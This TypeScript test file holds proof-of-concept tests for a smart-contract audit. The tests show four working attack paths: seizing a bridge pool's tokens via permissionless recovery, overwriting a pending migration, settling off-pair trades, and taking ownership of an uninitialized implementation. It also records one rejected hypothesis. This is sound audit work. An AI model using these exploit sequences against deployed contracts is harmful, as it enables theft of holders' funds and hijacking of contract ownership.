import { expect } from "chai";
import { Contract } from "ethers";
import {
  connection,
  ethers,
  owner,
  signer1,
  signer2,
  signer3,
} from "../../TestBase.ts";
import { getSignature } from "../../Intent.ts";
import { deployFixture, mintAndWrap } from "../../Fixtures.ts";
import { setBalance } from "../../../scripts/helpers/setBalance.ts";

// Proof-of-concept tests for the Semantic Guard Analysis audit of branch `ai-audit`.
//
// Scope: SecondaryMarket / TradeReactor (market), BridgedSharesUnderAgreement / Recoverable
// (bridged token), Modification / DragAlong (shareholder agreement governance),
// BridgedSharesUnderAgreement.initialize (proxy pattern).
//
//   Finding 1 (M) — BridgedSharesUnderAgreement inherits Recoverable's permissionless
//               initRecovery()/recover(): anyone can register a recovery against the CCIP pool
//               (or any holder) and seize the entire bridged-token balance after 184 days.
//               mint()/burn() are guarded by onlyPool, but the recovery path moves balances
//               without the pool, contradicting the contract's documented invariant that supply
//               is "controlled exclusively by the CCIP pool".
//   Finding 2 (M) — Modification._propose() checks only isQualified(); a 10%+ holder can silently
//               overwrite a pending migration/termination (successor + type + veto timer reset)
//               with no OfferPending-style guard, unlike DragAlong.offerAcquisition().
//   Finding 3 (L) — SecondaryMarket.process() executes trades without the CURRENCY/TOKEN pair
//               check that validateOrder() enforces: off-pair tokens can be matched through the
//               market (router==0 => anyone), producing fee revenue in arbitrary tokens.
//   Finding 4 (L) — Upgradeable implementations (BridgedSharesUnderAgreement etc.) are deployed
//               without _disableInitializers(); anyone can call initialize() on the deployed
//               implementation and take over its storage, including the owner slot.
//   Exclusion  — SecondaryMarket.placeOrder() was hypothesized to always revert (filler mismatch)
//               but is verified WORKING: the market is the msg.sender that matches the intent
//               filler when forwarding to the reactor, so the guard chain is sound.
//
// These PoCs run against the deployed fixture; see Fixtures.ts.

const DETERRENCE_FEE = ethers.parseEther("0.01");
const RECOVERY_DELAY = 184n * 24n * 60n * 60n;

async function deployShares(symbol: string = "TST"): Promise<Contract> {
  const Shares = await ethers.getContractFactory(
    "contracts/shares/base/Shares.sol:Shares"
  );
  const shares = await Shares.deploy(
    symbol,
    "Test Company Shares",
    "https://test.com/terms",
    owner
  );
  await shares.waitForDeployment();
  return shares as unknown as Contract;
}

async function deploySha(base: Contract): Promise<Contract> {
  const Sha = await ethers.getContractFactory(
    "contracts/shares/sha/SharesUnderAgreement.sol:SharesUnderAgreement"
  );
  const sha = await Sha.deploy(base, "https://test.com/agreement", 0, owner);
  await sha.waitForDeployment();
  return sha as unknown as Contract;
}

describe("SemanticGuardAnalysis PoCs", () => {
  describe("F1: bridged token inherits permissionless recovery (pool/holder seizure)", () => {
    it("anyone can seize the CCIP pool's bridged-token balance after 184 days", async () => {
      const BSHA = await ethers.getContractFactory(
        "contracts/multichain/BridgedSharesUnderAgreement.sol:BridgedSharesUnderAgreement"
      );
      const bsha = await BSHA.deploy(
        "BSHA",
        "Bridged SHA",
        "https://test.com/terms",
        owner
      );
      await bsha.waitForDeployment();

      const pool = await signer3.getAddress();
      await bsha.connect(owner).setPool(pool);
      await bsha.connect(signer3).mint(pool, 1000n);
      expect(await bsha.balanceOf(pool)).to.equal(1000n);

      // mint() is correctly pool-only...
      await expect(
        bsha.connect(signer1).mint(signer1, 1n)
      ).to.be.revertedWithCustomError(bsha, "NotPool");
      // ...but the inherited recovery path is unguarded: a stranger registers the pool as "lost".
      await setBalance(await signer1.getAddress(), ethers.parseEther("1"));
      await bsha
        .connect(signer1)
        ["initRecovery(address)"](pool, { value: DETERRENCE_FEE });
      await connection.networkHelpers.time.increase(RECOVERY_DELAY + 1n);
      await bsha.connect(signer1).recover(pool);

      expect(await bsha.balanceOf(pool)).to.equal(0n);
      expect(await bsha.balanceOf(await signer1.getAddress())).to.equal(1000n);
    });
  });

  describe("F2: Modification._propose allows silent overwrite of a pending migration", () => {
    it("a 10%+ holder replaces the issuer's pending termination with a migration to their own token", async () => {
      const shares = await deployShares();
      const sha = await deploySha(shares);
      await mintAndWrap(shares, sha, signer1, 20n);

      const evil = await deployShares("EVIL");
      await sha.connect(owner).proposeTermination();
      const before = await sha.migration();
      expect(before.migrationType).to.equal(3n); // TYPE_TERMINATION

      // No OfferPending-style guard: the qualified holder silently overwrites successor + type + timer.
      await sha.connect(signer1).proposeMigration(evil);
      const after = await sha.migration();

      expect(await evil.getAddress()).to.equal(after.successor);
      expect(after.migrationType).to.equal(1n); // TYPE_DEFAULT
      expect(after.timestamp).to.not.equal(before.timestamp); // veto window restarted
    });
  });

  describe("F3: SecondaryMarket.process executes off-pair trades", () => {
    it("process() bypasses the CURRENCY/TOKEN pair check that validateOrder() enforces", async () => {
      const { shares, sharesUnderAgreement, tradeReactor } =
        await connection.networkHelpers.loadFixture(deployFixture);
      const sharesAddr = await shares.getAddress();
      const shaAddr = await sharesUnderAgreement.getAddress();
      const reactorAddr = await tradeReactor.getAddress();

      // Market is configured for currency=shares / token=sha; X is an unrelated token.
      const shares2 = await deployShares("XXX");
      const xAddr = await shares2.getAddress();
      await shares2.connect(owner).mint(signer1, 1000n);
      await shares.connect(owner).mint(signer2, 1000n);

      const SecondaryMarket = await ethers.getContractFactory(
        "SecondaryMarket"
      );
      const market = await SecondaryMarket.deploy(
        owner,
        sharesAddr,
        shaAddr,
        reactorAddr,
        ethers.ZeroAddress
      );
      await market.waitForDeployment();
      const marketAddr = await market.getAddress();

      const now = BigInt(await connection.networkHelpers.time.latest());
      const sellIntent = {
        owner: await signer1.getAddress(),
        filler: marketAddr,
        tokenOut: xAddr,
        amountOut: 10n,
        tokenIn: sharesAddr,
        amountIn: 150n,
        creation: now,
        expiration: now + 3600n,
        data: "0x",
      };
      const buyIntent = {
        owner: await signer2.getAddress(),
        filler: marketAddr,
        tokenOut: sharesAddr,
        amountOut: 150n,
        tokenIn: xAddr,
        amountIn: 10n,
        creation: now,
        expiration: now + 3600n,
        data: "0x",
      };
      const sellSig = await getSignature(signer1, sellIntent, reactorAddr);
      const buySig = await getSignature(signer2, buyIntent, reactorAddr);

      await shares2.connect(signer1).approve(reactorAddr, 1000n);
      await shares.connect(signer2).approve(reactorAddr, 1000n);

      // The order-book validator rejects the pair...
      await expect(
        market.validateOrder(sellIntent, sellSig)
      ).to.be.revertedWithCustomError(market, "WrongTokens");
      // ...but process() settles it anyway (router == 0, so anyone can call it).
      await market
        .connect(signer3)
        .process(sellIntent, sellSig, buyIntent, buySig, 10n);

      // Seller received 150 - 1.9% fee = 148 in the market's CURRENCY for a token that is NOT the market's TOKEN.
      expect(await shares.balanceOf(await signer1.getAddress())).to.equal(148n);
      expect(await shares2.balanceOf(await signer2.getAddress())).to.equal(10n);
    });
  });

  describe("F4: implementations can be re-initialized by anyone", () => {
    it("a stranger takes ownership of a directly-deployed BridgedSharesUnderAgreement via initialize()", async () => {
      const BSHA = await ethers.getContractFactory(
        "contracts/multichain/BridgedSharesUnderAgreement.sol:BridgedSharesUnderAgreement"
      );
      const bsha = await BSHA.deploy(
        "BSHA",
        "Bridged SHA",
        "https://test.com/terms",
        owner
      );
      await bsha.waitForDeployment();
      expect(await bsha.owner()).to.equal(owner);

      await bsha
        .connect(signer3)
        .initialize(
          "X",
          "Attacker Token",
          "https://evil.com",
          await signer3.getAddress()
        );

      expect(await bsha.owner()).to.equal(await signer3.getAddress());
      expect(await bsha.symbol()).to.equal("X");
    });
  });

  describe("EXCLUSION: placeOrder filler guard chain is sound (not a finding)", () => {
    it("market-generated intents (filler = market) can be placed and signaled", async () => {
      const { shares, sharesUnderAgreement, tradeReactor } =
        await connection.networkHelpers.loadFixture(deployFixture);
      const sharesAddr = await shares.getAddress();
      const shaAddr = await sharesUnderAgreement.getAddress();
      const reactorAddr = await tradeReactor.getAddress();

      const SecondaryMarket = await ethers.getContractFactory(
        "SecondaryMarket"
      );
      const market = await SecondaryMarket.deploy(
        owner,
        sharesAddr,
        shaAddr,
        reactorAddr,
        ethers.ZeroAddress
      );
      await market.waitForDeployment();
      const marketAddr = await market.getAddress();

      const generated = await market.createBuyOrder(
        await signer1.getAddress(),
        100n,
        10n,
        3600
      );
      expect(generated.filler).to.equal(marketAddr);

      const now = BigInt(await connection.networkHelpers.time.latest());
      const intent = {
        owner: await signer1.getAddress(),
        filler: marketAddr,
        tokenOut: sharesAddr,
        amountOut: 100n,
        tokenIn: shaAddr,
        amountIn: 10n,
        creation: now,
        expiration: now + 3600n,
        data: "0x",
      };
      const sig = await getSignature(signer1, intent, reactorAddr);

      // The market forwards the intent; the reactor sees msg.sender == market == intent.filler.
      await market.connect(signer1).placeOrder(intent, sig);

      const signal = await tradeReactor.getFilledAmount(intent);
      expect(signal).to.equal(0n);
    });
  });
});
